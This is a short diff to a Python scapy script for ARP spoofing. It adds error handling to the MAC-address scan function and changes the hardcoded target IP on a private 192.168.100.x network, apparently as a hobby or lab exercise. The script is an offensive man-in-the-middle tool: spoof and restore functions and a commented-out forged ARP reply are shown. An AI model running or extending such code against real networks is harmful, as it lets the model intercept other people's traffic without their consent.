@@ -3,13 +3,14 @@ import scapy.all as scapy
 import time
 
 def scan(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
-
-    return answered_list[0][1].hwsrc
+    try:
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast/arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+        return answered_list[0][1].hwsrc
+    except IndexError:
+        pass
 
 def spoof(target_ip, spoof_ip):
     target_mac = scan(target_ip)
@@ -23,7 +24,7 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "192.168.100.13"
+target_ip = "192.168.100.7"
 gateway_ip = "192.168.100.1"
 
 # packet1 = scapy.ARP(op=2, pdst="192.168.100.1", hwdst="48:9D:D1:D1:FF:32", psrc="192.168.100.10")
